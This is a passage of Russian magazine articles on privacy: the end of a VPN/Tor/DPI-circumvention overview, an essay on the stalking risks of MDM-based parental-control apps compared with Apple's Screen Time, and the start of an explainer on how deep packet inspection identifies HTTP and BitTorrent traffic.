ющих с PPTP, не устойчив. Часть из них подвержена расшифровке даже
в автоматическом режиме. Потому я не советую использовать PPTP. Этот
протокол име ет серьезные уязвимос ти как в аутентификации, так и в шиф‐
ровании и позволя ет зло умышленнику очень быстро вскрыть канал и получить
доступ к данным.
  Более новый способ соз дания соединения — еще один протокол, пос тро‐
енный поверх PPP, — L2TP (Layer 2 Tunneling Protocol). Цель этого про‐
токола — не столько защитить соединение, сколь ко пол ностью регламен‐
тировать процесс сооб щения компьютеров в сети. Данный протокол, кроме
создания соединений VPN, также использует ся, например, для подключения
банкоматов к офисам банков, что служит некоторой гарантией. Хотя и стоит
учесть, что собственного шифрования у L2TP нет.
   L2TP не защищает сами данные, переда ваемые в его рамках. Для этого
обычно используется протокол IPsec (IP security). Он призван защищать
содержимое пакетов IP и благодаря этому может шифровать любые виды
соединений. Для VPN из двух возможных режимов используется лишь тун‐
нельный, защищающий не только данные переда ваемого пакета в сети, но и
его заголовки. Благодаря этому со стороны не будет видно, кто отправитель
данных.
   IKE и IKEv2 (Internet Key Exchange) — строгие алгоритмы шиф‐
рования и защиты данных, переда ваемых по информационному каналу.
Используется исключительно с IPsec, так как является его защитным слоем —
именно  благодаря  IKE  данные  в  соединении  остаются  под  замком.
В общем‐то, эти алгоритмы и пос лужили основой для развития всех сов‐
ременных средств и утилит создания соединений VPN, но настало время
поговорить о том, что и из чего выбирать.
  С распространением SSL и TLS про токол PPP был расширен до SSTP
(Secure Socket Tunneling Protocol) и в таком виде работает не через
открытое соединение, а по SSL. Это гарантиру ет надежное шифрование
и защиту от потери пакетов. Но стоит учитывать, что SSTP был разработан
в Microsoft, а Microsoft сотрудничает с правитель ствами, поэтому доверять
SSTP можно только с учетом это го.
  OpenVPN — самое популярное решение для создания защищенного
соединения. Этот протокол открыт и предоставляет самую серьезную защиту,
поэтому ему можно доверять. Нас тройка соеди нения вряд ли займет больше
пары минут.
   SoftEther — мультиклиент для работы как с описанными выше протоко‐
лами, вклю чая OpenVPN, так и со своим собственным, не менее безопасным,
чем OpenVPN.
  В таблице ниже — небольшое резюме по этим решениям.





                    Сравнение протоколов VPN


TOR
Tor (The Onion Router) — одно из лучших средств для обеспечения ано‐
нимности в Сети. Схема работы подразумевает трехкратную защиту данных
и анонимизацию трафика.
   Как описано в самом наз вании, Tor использует так называемую луковую
маршрутизацию: твои данные — это сердцевина лука, а их защита — слои
вокруг. Так, каждый из промежу точных серверов Tor снимает свой слой
защиты, и только третий, последний из них, дос тает сердцевину и отправляет
запрос в интернет.





                 Схема работы компьютера в сети Tor

Работу всей системы обеспечивают тысячи энту зиастов по всему миру,
борющиеся за права человека и приватность. Благодаря этому для каждого
отдельного сайта строится собственная цепочка промежуточных серверов
Tor, что дает полную защиту: каждый сайт — новая личность.
   Большой плюс Tor — стабильность работы и боль шая забота об аноним‐
ности: благодаря усердиям многих специалис тов он работает даже в Китае,
стране, которая широко известна своим строжайшим подходом к блокиров‐
кам и наказаниями за их обход.
  Для  упрощения  жизни  пользователям  раз работчики  создали  Tor
Browser, основанный на Firefox, и улучшили его допол нениями, запреща‐
ющими сайтам следить за тобой. Например, HTTPS Everywhere заставляет
веб‐сайты использовать шифрование, а NoScript отключает выполнение
скриптов на странице, фактически зап рещая собирать любые данные поль‐
зователя.
   Скачать Tor, как и прилага ющийся к нему бра узер, можно на официальном
сайте проекта Tor Project.


DPI
К сожалению, все эти средства могут ока заться бесполезными, если твой
провайдер начал блокировки с применением DPI (Deep Packet Inspec-
tion) — системы глубокого ана лиза сетево го тра фика. Цель DPI — отбра‐
сывать все, что не похоже на работу обычного человека за обычным компь‐
ютером, то есть блокиро вать любую подоз ритель ную активность. А все спо‐
собы анонимизации трафика априори подозрительны, поэтому программы
зачастую дают сбои или в принципе отказыва ются работать.
  Но и с этим можно бороться. Почти для каждой из описанных воз можнос‐
тей защищать канал свя зи есть надстройки, помогающие обходить зоркое
око анализаторов DPI. Например, Shadowsocks имеет встроенную защиту
от DPI и притворяется, что выполняет обычное подключение к удаленному
серверу.
  OpenVPN сам по себе лег ко раз личим, но stunnel поз воляет также обой ти
анализ пакетов. Stunnel мас кирует канал VPN под соединение SSL, которое
с виду безобидно: это может быть и простой браузер, который обращается
к сайту по HTTPS. Благода ря это му заб локировать такой туннель непросто.
Если перестараться, можно заблокировать вообще все.


             INFO

                     Подробнее о настройке OpenVPN и stunnel читай
                        в статье «Твой тайный тун нель. Детальный гайд
                      по настройке OpenVPN и stunnel для создания
                    защищенного канала».


Обходить DPI также помогает tls-crypt, режим, введенный в версии Open‐
VPN 2.4, который шифрует тра фик VPN.
  Создатели Tor Browser специально работа ют над обходом средств ана‐
лиза DPI. При подклю чении к сети Tor можно воспользоваться транспор‐
том‐прослойкой, которая обеспечивает беспрепятственное подключение
к первому серверу защищенной сети. Этот транспорт можно либо выбрать
из списка  (это обще доступные серверы), либо получить персональный
на официальном сайте Tor Bridges.
   Лучше всего себя показывает obfs4 — это обфускатор, перемешивающий
передаваемые данные так, что в сети их нельзя определить. DPI обычно про‐
пускает такие пакеты, поскольку не может предположить, что находится внут‐
ри.
  Еще есть несколько программ, которые пытаются тем или иным способом
обмануть анализ пакетов, например раз бивая их на мел кие части или меняя
заголовки. В их числе GoodbyeDPI или Green Tunnel с простым графичес ким
интерфейсом — они не скрывают ни IP, ни данные, но обходят блокировку.
   Кардинальным решением мож но счи тать проект Streisand, его русское
описание есть на GitHub. Это палочка‐выруча лочка в мире безопасности дан‐
ных. Эта утилита всего за несколько минут разверты вает и настраивает
на удаленном сервере сразу нес колько сервисов для защиты данных, а также
дает подробную инструкцию по ним.


ИТОГ
Для сохранения нашей с тобой интернет‐безопасности и анонимности при‐
думано множество технологий самого разного уровня. Часть из них провере‐
на временем, другая помогает против новей ших методов цензуры. Благодаря
этому мы еще можем оставаться невиди мыми, нуж но лишь не забывать поль‐
зоваться этой возможностью.
ПРИВАТНОСТЬ

 ВРЕДИТЕЛЬСКИЙ
   КОНТРОЛЬ





                      ЧЕМ ОПАСНЫ
                     ПРИЛОЖЕНИЯ
                  ДЛЯ ОГРАНИЧЕНИЯ
                   ФУНКЦИЙ IPHONE





В  конце апреля  в средствах массовой
информации прокатилась очередная волна
публикаций на тему «Apple уничтожает кон‐
куренцию». На сей раз скандал породила
статья  с  провокационным  заголов ком           Олег Афонин                                                                                      Эксперт по мобильной
«Apple расправилась с приложениями про‐       криминалистике«Элкомсофт»компании
тив зависимос ти от iPhone», опубликован‐        aoleg@voicecallcentral.com
ная в New York Times. Авторы обвинили
Apple  в  нечес тной  конкуренции  просто
на основании того, что компания уда лила
из App  Store приложения, позволяющие
контролировать   время   использования
смартфона и его фун кций.


Но идет ли речь о нечес тной игре, или же приложения действительно пред‐
ставляли опасность? Попробуем разобрать ся.


В ЧЕМ ОБВИНЯЮТ APPLE
Обвинения, выдвинутые про тив Apple, можно довольно четко структуриро‐
вать. Авторы оригинальной статьи в NY Times заняли сле дующую позицию.
С точки зрения журналис тов, раз работчики ряда приложе ний с тысячами
платных (что особо подчеркнуто) клиентов предлагали решения, позволя‐
ющие пользователям бороть ся с зависимостью от гаджетов. В некоторых
случаях речь шла и о приложениях, позволявших родителям, цитиру ем, «кон‐
тролировать устройства собственных детей или блокировать доступ к опре‐
деленным приложениям и контенту 18+».
  По мнению журналистов (и давших журналис там интервью производите‐
лей удаленных приложений), в Apple поступили так потому, что в iOS появи‐
лась встроенная подсистема «Экранное время», взявшая на себя часть фун‐
кций заблокированных приложений. Дальнейшее содержимое статьи мало‐
интересно и представляет собой типичный пример американской журналис‐
тики: приводятся интервью с пострадавшим от зависимос ти от iPhone,
который смог преодолеть собственноручно уста новленное в «Экранном вре‐
мени» ограничение, и родителей, сетующих на то, что их дети находят спо‐
собы обойти установленные «Экранным временем» блокировки.
   Таким образом, Apple обвиняют в следующих грехах:
 1. Компания удалила или заставила произво дителей убрать «ключевую фун‐
   кциональность», поз воляющую отслеживать и ограничивать действия
   пользователя устройства.
 2. В Apple сделали это сразу пос ле того, как аналогичная (но, конечно же,
   гораздо хуже — так следует из статьи) функция появилась в iOS.
 3. Из первых двух пунктов следует вывод: Apple нерыночными (читай —
   нечестными) методами огра ничивает конкуренцию.

Казалось бы, не поспоришь. В App Store действительно стало меньше при‐
ложений, реализующих контроль экранного времени и родительский кон‐
троль, а эффектив ность оставшихся заметно снизилась. И по времени
как совпало — статья в NY Times появилась аккурат после выхода iOS
12 со встроенной функцией «Экранного времени». Однако стоит прис‐
мотреться к деталям, и «дело раз валива ется».


ТАЙМЛАЙН
Казалось бы, все просто: Apple выпускает iOS 12 с функцией «Экранного вре‐
мени» — Apple выкидывает из App Store конкурентов. Не то чтобы компания
никогда такого не делала; дос таточно вспомнить приложе ние f.lux, уводящее
экран устройства в теплые оттенки, и реакцию Apple. Однако здесь не тот слу‐
чай.
 • Факт 1: в iOS 12, вышедшей в июне 2018 года, появи лась функция
   «Экранное время», которую предлагается исполь зовать в целях родитель‐
   ского контроля.
 • Факт 2:  Apple действительно вычистила  из магази на приложения,
   которые предлагали пользователям установить профиль конфигурации
   для работы функций родительского контроля. В компании сослались
   на пункт 2.5.1 руководства для разработчиков приложений .

Корреляция? Не совсем. В Apple начали рас следова ние в отношении прак‐
тики использования корпоративных и MDM‐сертификатов и профилей кон‐
фигурации  обычными   (не  корпоративными)  приложе ниями  еще  в
начале 2017‐го, а соот ветству ющий запрет появился в App Store в середи‐
не 2017‐го, за год до выхода iOS 12.
  В Apple сочли необ ходимым отреагировать на провокационный матери ал,
опубликовав статью, объясня ющую при чины, по которым были удалены при‐
ложения. В статье подробно объясня ется, что такое MDM‐сертификаты и чем
они могут быть опасны.
   Кто здесь прав, а кто виноват? Apple очень не любит, когда кто угод но,
кроме самой компании, вмешивается в работу iOS и сторонних приложе ний.
Именно эта нелюбовь в июне 2018 года послужила Apple поводом заб‐
локировать обновле ния блокировщиков рекламы, которые использовали
локальные VPN для филь тра ции тра фика: по мнению компании, это было пря‐
мым вмешательством в работу других при ложений, что правилами App Store
запрещено в явном виде все тем же пунктом 2.5.1 руководства для раз работ‐
чиков приложений. Ранее тот же пункт был использован против разработ‐
чиков приложения f.lux.


             INFO

                     Уже после того, как была написана эта статья,
                        в новостях прошла информация о том, что Apple
                      отменяет запрет на использование MDM‐сер‐
                      тификатов для приложе ний родительского кон‐
                        троля. Вероятно, решение было принято под дав‐
                       лением судебных исков от многочисленных раз‐
                       работчиков подобных приложений. Сторонники
                       гиперопеки могут возрадоваться: очень скоро
                      они смогут вновь воспользоваться сомнитель‐
                    ными  инструментами  родительского  контроля,
                       которые легко можно превратить в технические
                       средства для слежки и преследования.



ЧТО ТАКОЕ ПРОФИЛИ КОНФИГУРАЦИИ В IOS И ПОЧЕМУ ЗА ИХ
ИСПОЛЬЗОВАНИЕ БАНЯТ
Профили конфигурации — мощный инс трумент, поз воляющий корпоратив‐
ным пользователям и раз работчикам про изводить мас совую настройку
устройств и обходить некото рые встроенные в iOS ограниче ния. Подробнее
о профилях кон фигурации можно почитать по ссылке; нас же интересует
самый первый пункт в списке того, что можно сделать при помощи профиля
конфигурации: Restrictions on device features.
  Использование огра ничений через уста новку профиля конфигурации поз‐
воляет блокировать (фактически — удалить) любой набор приложений, вклю‐
чая системные. Kaspersky Safe Kids использовал эту возможность для бло‐
кировки браузера Safari. Кроме того, посредс твом профиля конфигурации
можно разрешать или запрещать устройству подклю чаться к компьютеру,
создавать резервные копии, менять или сбрасывать пароли и многое дру‐
гое — в том числе такие вещи, которые недоступны даже через настройки
«Экранного времени».
  Штатный сценарий для профилей конфигурации — примене ние в устрой‐
ствах, которые принадлежат компании и выданы работникам во вре менное
пользование. Профили конфигурации могут задейстоваться и в дру гих целях.
К примеру, некоторые приложения (в час тности, компании Olympus) исполь‐
зуют профили конфигурации для настройки доступа к внешнему устройству (в
случай Olympus — фото аппарата) через Wi‐Fi. Тем не менее даже такое
использование профилей противо речит политике Apple, потому что профиль
конфигурации распространяется не через App Store, а его использование
действительно потенциально опасно.


О БЕЛЫХ И ПУШИСТЫХ
Среди компаний, чьи продукты попали под пристальное внимание Apple, —
компания Касперских, которая вынуж дена была удалить «ключевые функции»
из приложения Kaspersky Safe Kids. Компания даже подала жалобу на дей‐
ствия Apple в Антимонопольный комитет и ана логичный орган в ЕС. Действи‐
тельно, в актуальной версии приложения воз можнос тей осталось, откровен‐
но говоря, негусто. А что там было до того, как вмешалась Apple?
  Сейчас мы уже не можем установить ста рую версию при ложения, но по
описанию ее возможнос тей и сохранившимся обзорам впол не можно пред‐
ставить себе функциональность  программы. Для эффективной работы
Kaspersky Safe Kids пос ле установки требова ла добавить в систему профиль
конфигурации, обладающий довольно интересными свойствами.





                    Источник: uk.pcmag.com

 • Нельзя было удалить с устройства без код‐пароля (пароль должен был
   получить наблюдатель из акка унта  Kaspersky). Разуме ется, наб люда‐
  емый — тот, на чье устройство устанавливал ся такой сертификат, —
   не мог ни удалить сертификат, ни даже сбросить устройство (только через
   recovery mode с последующей нас трой кой). При этом возраст наблюда‐
  емого объекта  указывался  наблюдателем  в  приложе нии  Kaspersky;
   с реальным возрастом наблюда емо го он не коррелировал. Изменить воз‐
   растные настрой ки жертва слежки не могла.
 • Лю бая попытка что‐либо сделать с сертифика том не только пресека‐
   лась — о ней моменталь но уведомлялся наблюдатель. Своеоб разный ана‐
   лог электрической загороди с сигнализацией.
 • Встроенный браузер Safari блокировался. Вмес то него наблюдаемому
   предлагалось исполь зовать «карманный» бра узер Kaspersky. Разумеется,
   все действия в этом бра узере контролировались чуть более чем пол‐
   ностью, вплоть до моментального уведомления наблюдателя при попытке
   зайти на ограниченный ресурс.
 • Наблюдатель мог уста навливать так называ емый geofence (разрешенную
   территорию). Если жертва слежки покидала разрешенную территорию,
   наблюдатель получал уведомление. Кста ти — возможность очень похожа
   на опцию «женского контроля» в Саудовской Аравии.
 • Наблюдатель получал уведомления в реальном времени, предупреждав‐
  шие о любой попытке наблюда емого каким‐либо образом вырваться
   из‐под опеки: отключить блокировки, удалить сертификат и так далее.

Для удаления приложения с устройства жертве наб людения нужно было про‐
делать неочевидную пос ледова тельность действий:
 1. Узнать, что для слежки используется именно этот продукт.
 2. Узнать о существовании учетной записи в кабинете My Kaspersky.
 3. Узнать логин и пароль от учетной записи My Kaspersky.
 4. Зайти в кабинет и узнать PIN‐код для удаления про филя.





 5. Зайти в настройки профилей и удалить профиль Kaspersky.





 6. Ввести PIN‐код из кабинета My Kaspersky.





Только после это го можно было уда лить при ложение Safe Kids. Как видим,
если жертвой преследова ния становился ребенок старше тринадцати лет
или совсем не ребенок, очевидного способа изба виться от слежки не сущес‐
твовало. Подобным образом работали и мно гочисленные аналоги.
   Вот обзор старой версии приложения до того, как компании запретили
использовать профили. Вывод журналис та: «Kaspersky Safe Kids — лучший
инструмент родительского контроля из доступных на iOS».
  Возможно, с техничес кой точки зрения «плот ности» опеки и защиты
от попыток наблюдаемого вырваться из‐под нее продукт Касперских и «луч‐
ший», но если посмотреть с дру гих точек зрения — становится неуютно. Поп‐
робуем разобраться, что здесь не так.


ЧТО НЕ ТАК С ПРИЛОЖЕНИЯМИ КОНТРОЛЯ ЭКРАННОГО ВРЕМЕНИ
Родительский контроль — частный случай контроля экранного вре мени.
До описываемых событий в App Store присутство вало довольно много при‐
ложений, реализующих контроль экранного времени через корпоративные
сертификаты  MDM.  Посещаемые  ресурсы  контролировались  часто
при помощи еще одной функции, использование которой нарушает правила
App Store, — локального VPN, подобного тому, что присутствует в некоторых
блокировщиках рекламы (например, AdGuard).
   Контроль экранного времени в целом и родитель ский контроль в час тнос‐
ти — палка о двух концах, он лег ко (слишком легко) превращается в шпионаж
и преследование. Означает ли это, что все приложения родительского кон‐
троля вредны, их использование нуж но зап ретить и от них отказаться?
Думаю, нет.
   Да, любые без исключения средс тва мониторинга и контроля можно
использовать для подгля дывания, шпиона жа и преследования. Тем не менее
до определенного возраста пра во родителей контролировать использование
гаджетов детьми, как правило, не оспарива ется.
  В разных странах раз лича ются как законы, так и условия жизни. В некото‐
рых странах поставлены вне закона техничес кие средства, которые можно
использовать для шпионажа и преследова ния, но практически везде дела‐
ются исключения для средств родительского контроля. Как правило, исполь‐
зование таких средств законно по отношению к лицам любого пола, но с
ограничением по возрасту (в Европе, к примеру, этот возраст — тринадцать
лет).
  В некоторых странах шпионаж и преследование женщин — нормальная
практика, узаконен ная государством. Вот, например, до чего может дойти.
  В приложении Absher («Госус луги») одной из «услуг», предоставляемых
государством Саудовской Ара вии, является слеж ка за лицами женского пола
и контроль за пересечением гра ницы опять же лицами женского пола. Жен‐
щина не может покинуть стра ну без разрешения мужчины, а при попытке
это  сделать  мужчина  получит  моментальное  уве домление.  В  фев‐
рале 2018 года двум сес трам из Саудовской Аравии удалось покинуть
мусульманский рай, получив доступ к телефону мужчины и выдав себе раз‐
решение на поездку от его имени (одновременно заблокировав уведом‐
ления). В том же месяце история широко разошлась в средс твах массовой
информации.
   Как мы знаем, Apple зорко отслежива ет возможные наруше ния прав
человека; это же подтвердил в своем интервью и глава компании Тим Кук,
пообещав «посмотреть». Очевидно, портить отно шения с целой страной ком‐
пании не захотелось, и дело было спу щено на тормозах. В конце апреля сес‐
тры‐беглянки напомнили о своем существовании, попытавшись под нять вто‐
рую волну публикаций, но на сей раз руководс тво Apple не сочло нужным
как‐либо высказаться. К сло ву, в Google никак не отреагировали и на первую
волну публикаций.
  Делаем первый важный вывод: так — мож но, но только если ты гражданин
Саудовской Аравии.
   Второй вывод в том, что для вполне законного контроля и прес ледования
кого бы то ни было можно обойтись и без каких‐то там профилей и сер‐
тификатов: вполне достаточно погранич ного контроля и портала «Госуслуг»
в соответствующей стране.
  Наконец, тре тий вывод: для того уровня контроля, который реализован
в приложении Absher, не нужно и само приложение. Уведомления о попытке
сбежать из страны могут с тем же успехом доставляться и по email или в SMS,
а разрешительные (или зап ретитель ные) действия можно проделать через
любой веб‐браузер. Проблема здесь не в App Store и даже не в приложении.


КАК ПРАВИЛЬНО?
Помимо законов, есть и личные предпочтения родительского контроля,
которые могут быть в диапазоне от «запретить все» до «все равно бесполез‐
но». По мнению автора, родительский контроль имеет право на существо‐
вание при соблюдении ряда граничных усло вий. Условий немного:
 1. Родительский контроль используется в явном виде (ребенок знает о его
   существовании).
 2. Детализация статистики не перехо дит черту разумного (разница между
   «оградить от обще ния с педофилами» и «читать всю переписку» существу‐
   ет, и реализуется она совершенно не техническими методами).
 3. У ребенка дол жна быть очевидная техничес кая возможность, достигнув
   совершеннолетия, выйти  из‐под  родительского  контроля — самос‐
   тоятельно и не спрашивая раз решения у родителей. Как следствие из это‐
   го пункта — у родителей не должно быть возможности возобновить кон‐
   троль техническими средствами без раз решения совершеннолетнего
   отпрыска (см. «преследова ние»).
 4. Технические средства родительского контро ля дол жны обладать четко
   прописанными политиками приват ности и работающими механизмами
   безопасности и охра ны персональ ных данных  (тут можно вспомнить
   про китайские детские часы с GPS‐трекера ми, данными с которых может
   воспользоваться практически кто угодно).

Из указанных выше пунктов важ ны все. Отрицатель ных примеров нас только
много, что даже нет смысла их искать, — от многочисленных кейлоггеров
родом из конца девяностых до разнообразных носимых устройств, обе‐
щающих обезопасить ребенка, но на практике лишь предоставляющих потен‐
циальным преступникам дополнительный удоб ный инстру мент.
   Автор знаком с семейством, где мать прес ледует собственную двенад‐
цатилетнюю дочь — буквально следит за ней, пря чась за кустами. Не видит
в этом ничего плохого. Дочь знает о поведении матери и сты дится его; в при‐
сутствии матери ребенок замкнут и необ щителен, «оживая» лишь в те момен‐
ты, когда матери точ но нет рядом. Психике ребенка уже нанесен непоп‐
равимый вред: когда девочка вырастет, у нее наверняка возникнут серьезные
проблемы с социализацией.
  Давать в руки таким родителям инстру менты родительского контроля, поз‐
воляющие вести скрытое наблюдение, — гарантированное усугубление пси‐
хологической травмы, связанное с грубым нарушением личного прос транс‐
тва. В интересах детей сделать так, чтобы подобных инструментов родитель‐
ского контроля не было. Вполне дос таточно одного, централизованного
и «правильного» решения, очень похожего на встроенный в iOS 12 режим
«Экранного времени».
  Выполняются ли в приложении «Экранное время» граничные условия?
 1. Информирование ребенка отдается на усмотрение родителей. Техничес‐
   ки приложе ние «Экранное время» не пытается себя спря тать или замас‐
   кировать.
 2. Статистика достаточно детальна, чтобы узнать, какие приложения и сколь‐
   ко времени использовал ребенок, какие веб‐сайты посещал в браузе ре
    Safari, — но не более того. Перехвата клавиату ры нет, чаты не отсле жива‐
   ются, журналы общения не ведутся.
 3. Если Apple ID ребенка учас твовал в «Семейном доступе», то, дождавшись
   совершеннолетия, ребенок может самос тоятельно выйти из «Семейного
   доступа» и  отключить «Экранное время». Более  того,  ограничения
   «Экранного времени», установленные родите лями, а также возможность
   дистанционно го отслеживания средствами «Экранного вре мени» будут
   отключены автоматически. До совершеннолетия ребенок может покинуть
  «Семейный доступ» в тринадцать лет (до этого времени ребенок должен
   оставаться в «Семейном доступе»). Наконец, если «Экранное время»
   использовалось без «Семейного дос тупа», то единственный способ
   самостоятельно сбросить пароль ограничений — сброс всего устройства
   (альтернатива — воспользоваться одним из многочисленных приложений,
   которые могут извлечь пароль «Экранного времени» из резервной копии
   устройства, локальной или облачной).

Вывод? Условия выпол няются с натяжкой. Если Apple ID ребенка не участво‐
вал в «Семейном доступе», а огра ничения «Экранного времени» были нас‐
троены, единственный штатный способ избавиться от ограниче ний — сброс
устройства. Нештатные спо собы существу ют в виде сторонних при ложений,
которые способны извлечь соответству ющий пароль из резервной копии
устройства, созданной при помощи iTunes или извлеченной из облака iCloud.
Еще один отрицательный момент — ребенок не сможет после сброса восста‐
новить устройство из резервной  копии; если  это сделать,  то пароль
«Экранного времени» будет также вос ста новлен:



      Если вы забыли пароль для огра ниче ний, уста нов ленный в пре дыду-
     щей вер сии iOS, или же пароль к функции «Экранное вре мя», сотрите
      все данные с устройства и нас тройте его как новое, чтобы уда лить
      пароль. При вос ста нов лении данных устройства из резер вной копии
      пароль не уда ляется.

Каков минимально необ ходимый уровень родитель ского контроля? Универ‐
сального рецепта нет: многое зависит как от возраста ребенка, так и от усло‐
вий окружающей среды с акцентом на здра вый смысл родителей. В семье
автора данного текста контроль ограничен сбором статистики (время исполь‐
зования устройства и приложений без авто матизированных ограничений)
и функцией, блокирующей контент 18+ и тот, что был признан неприемлемым
сообществами соот ветствующих социальных сетей. Также ограничена воз‐
можность сброса устройства и смены Apple ID.
  А что насчет возраста ребенка? До восемнадца ти лет у ребенка нет закон‐
ного способа вырваться из‐под цифровой гиперо пеки, если таковая имеет
место быть. Хорошо, если ребенок ока жется умнее родителей и суме ет сох‐
ранить частицу приватности в условиях пос тоянной слежки (в американских
СМИ о таких случаях пишут сплошь и рядом). Иногда единс твенный вари‐
ант — сброс устрой ства до заводских настро ек, соз дание свежего Apple ID
с двухфакторной аутентификацией и настройка с нуля.


ЗАКЛЮЧЕНИЕ
Как сделать так, чтобы родитель ский контроль не превратился в гиперопеку?
Где грань между интереса ми ребенка и преследова нием? Какие вещи можно
и нужно ограничивать технически, а какие требуют от родите лей быть родите‐
лями и общаться с собственным ребен ком? Найти точку равновесия трудно,
тем более что баланс зависит как от внешних факторов, так и от убеждений
самих родителей. В таком контексте «Экранное время» выглядит разумным
компромиссом, предос тавляя возможности для контроля использования гад‐
жетов и мониторин га действий ребенка — контроля, не переходящего (или
переходящего?) ту грань, когда монито ринг превращается в слежку и прес‐
ледование. Выглядит ли разумным решение Apple ограничить возможности
сторонних приложений контроля экранного времени? С точки зрения общес‐
твенного психоло гического здоровья и защиты интересов детей (в ущерб
паранойе их родителей) решение выглядит весь ма разумным. С точки зрения
препятствования конкуренции оно кажет ся более сомнительным — но дан‐
ный случай не первый и не последний в череде подобных.


        WWW

                         •Статья, с которой все началось
                    •Продолжение темы приложений для контроля
                         экранного времени
                      •Как    настроить    родительский    контроль
                       при помощи «Экранного времени»
  ПРИВАТНОСТЬ

 ВСЕВИДЯЩЕЕ ОКО
DPI



                  КАК РАБОТАЕТ ГЛУБОКАЯ
                  ИНСПЕКЦИЯ ПАКЕТОВ
               И КАК ОТ НЕЕ СКРЫТЬСЯ





                                  Михаил Киреев
                                           kireevmp@yandex.ru




  Многие страны мира начали повсеместно внедрять тех‐
   нологии для слежки за своими гражданами и анализа их
   поведения. Механизмы вроде DPI огра ничивают нашу сво‐
   боду в Сети. Чтобы вступить в честный бой с этими механиз‐
   мами, очень важно разобраться, как все устроено внутри.


   ПРОВАЙДЕРЫ И DPI
    У провайдеров есть две проб лемы:
     • они обязаны ограничивать дос туп к некоторым данным в соответствии
      с законом;
     • ни одна компания не хочет пла тить лишние деньги за собственное соеди‐
      нение с провайдером уровня выше, которое, очевидно, тарифициру ется.

   И  та и другая проб лема реша ется ограничением отдельных запросов
    или протоколов, с чем справляется тот самый глу бокий анализ пакетов — DPI.
      Рядовых пользователей это лиша ет многих воз можностей. Провайдер,
    например, способен заблокировать или сильно замед лить весь трафик про‐
    токола BitTorrent, так что качать торренты станет невозможно. Или, ради
   дополнительной выгоды, может «отключать» VoIP и Skype для всех поль‐
    зователей, кроме тех, кто специально оплатил доступ.
       DPI способен обнаруживать и пресекать соединения по определенным
    правилам, а их возможнос ти зависят от производителя оборудования. Единс‐
    твенное, что их объединяет, — DPI работает начиная с транспортного уровня
    сетевой модели.


   СЕТЕВАЯ МОДЕЛЬ
   Компьютерные сети устро ены таким образом, чтобы работать над сложными
   приложениями, не думая о кабелях и битах.
      Для этого было определено четыре степени абстракции. Каждый сле‐
   дующий шаг вверх упро щает работу с информа цией, которая передается
   по сети.
     • Самый первый уро вень связи основан на физических процессах. Он
      позволяет определять и свя зывать устройства, работая с аппаратными
      адресами: это в первую очередь ARP, L2TP и PPP.
     • Второй слой, уро вень маршру тизации, затрагивает адреса IP и соз‐
       дает логическую связь между узлами IPv4, IPv6 и IPsec. Оба эти уровня —
      клю чевые, они описывают основу, то, как компьютеры могут друг друга
      найти.
     • Третий уровень — тран спортный — занимается данными: что переда‐
       вать и насколько качес твенно это делать. TCP и UDP — два ключевых про‐
       токола, которые занима ются переда чей данных на этом уровне, обес‐
      печивают сох ранность информации и ее порядок. Благодаря им все
      соединения строго регулируются.
     • Последний, четвертый уровень — прик ладной, поэтому его описание
      очень широко (из‐за нево обра зимо большого количества протоколов),
      а использование не обязательно, не все приложения это делают. Но если
      используют, то за дело берутся протоколы HTTP и WebSocket, чтобы ты
      мог сидеть в интернете, играть в MMORPG и чатиться. Протокол FTP
      используется в основном для обмена файлами, а POP и IMAP — электрон‐
      ной почтой.





            Пример инкапсуляции данных через соединение HTTP

   Оборудование DPI обычно работает с транспортным уровнем, пакетами TCP
   и UDP, читая не толь ко заголовки, но и содержимое пакетов.


   АНАЛИЗ ПАКЕТОВ ДАННЫХ
   Лю бой протокол имеет свою четко обоз наченную внутреннюю логику, а также
    специальные сигнатуры, которые позволяют учас тникам соединения опре‐
    делять, кто и о чем говорит.


   HTTP
   Давай разберем ся, например, с HTTP — самым популярным протоколом.
   Отправим запрос на http://xakep.ru.


    GET / HTTP/1.1
    Host: xakep.ru

    Стандартный запрос браузера: он отправляется на IP 178.248.232.27 (адрес
    сервера сайта, известен всем, так как исполь зуется для адресации), зап‐
   рашивает файл по адресу / на сайте xakep.ru (директива Host). Ключ к опре‐
    делению трафика HTTP — его характерный заголовок.
      1. Первые символы до первого пробела — название метода: GET, POST,
      HEAD — ключевые. Конечно,  есть и дру гие, но  эти три занимают
      более 97% от всех запросов HTTP.
      2. Символы от второго про бела и до конца стро ки — версия запроса. Обыч‐
      но это HTTP/1.1 или HTTP/1.0 .

   Все эти данные можно использовать, чтобы понять, какой это запрос и куда
   он идет. А если известен пункт назначения, то можно принять решение о бло‐
    кировке или, в случае с xakep.ru, о при оритиза ции соединения.
     Но в сов ременном мире все больше распространяется HTTPS, что же
    с ним?





                   Доля тра фика HTTPS в интернете

    Из‐за шифрования прочитать содержимое без подготовки невозможно. Есть
   один способ это сделать — атака Man in the Middle, когда злоумышленник
    (или провайдер) внедряется в соединение, представляясь пользователю сер‐
    вером, а серверу — настоящим клиентом.
     Но такое требует полного дос тупа к компь ютеру жертвы, так как сер‐
    тификат (а вместе с ним и ключ), который исполь зуется для защиты соеди‐
    нения, подписан, и никто не может его изменить.
     В таком случае провайдерам ничего не оста ется, кроме как блокировать
    трафик по единственной сос тавляющей — адресу  IP, что приводит к бло‐
    кировке не отдельной страницы (как могло бы быть без HTTPS), а все го
    ресурса, а если не повезет, то и нес кольких других, располагающихся на том
   же оборудовании.


    BitTorrent
    Из‐за большого объема трафика, который переда ется через пиринг, провай‐
   деры иногда пытаются ограничить скорость таких передач. Алгоритм переда‐
    чи данных в пиринговых сетях зна читель но сложнее по сравнению с алгорит‐
   мом HTTP, но разработчики DPI нашли способ идентифицировать и его.
      Если разбирать протокол именно сетей BitTorrent, то его можно разложить
    на несколько отдельных элементов, каждый из которых представляет собой
   набор относительно  легко идентифицируемых соединений. Соединения
    в μTorrent всегда начинаются либо с файла*.torrent, либо с магнитной
   ссылки. Внутри заключена информация о файлах в формате Bencode: наз‐
    вание файлов, структура папок, схема деления на части и, конечно, так
    называемые трекеры (announce).


    {
       "announce": "http://torrent.ubuntu.com:6969/announce",
       "announce‐list": [
          [
             "http://torrent.ubuntu.com:6969/announce"
          ],
          [
             "http://ipv6.torrent.ubuntu.com:6969/announce"
          ]
       ],
       "comment": "Ubuntu CD releases.ubuntu.com",
       "creation date": 1550184717,
       "info": {
          "length": 1996488704,
          "name": "ubuntu‐18.04.2‐desktop‐amd64.iso",
          "piece length": 524288,
          "pieces": 0x5D 0x9D 0xCD 0x4F ... 0x29 0x24 0x57 0xF0,
       }
    }

   Это преобразованное в читаемый вид содержимое файла torrent с дистри‐
